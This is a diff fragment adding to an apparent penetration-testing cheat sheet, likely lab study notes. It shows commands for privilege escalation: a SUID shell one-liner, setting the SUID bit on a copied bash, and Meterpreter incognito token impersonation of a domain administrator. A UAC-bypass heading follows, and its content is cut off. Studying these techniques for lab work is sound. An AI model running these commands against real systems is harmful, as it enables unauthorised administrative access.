@@ -287,6 +287,17 @@ exploit
 | Find SUID exploit | `find . -exec /bin/sh -p \; -quit` |
 | Make binary SUID | `chmod u+s /tmp/bash` |
 
+
+### Privilege Escalation via Token Impersonation
+Using `incognito` to impersonate `ATTACKDEFENSE\Administrator`:
+
+```bash
+load incognito
+list_tokens -u
+impersonate_token ATTACKDEFENSE\\Administrator
+getuid
+```
+
 ### Privilege Escalation via Akagi64.exe (UAC Bypass) with Reverse Shell
 
 ```bash
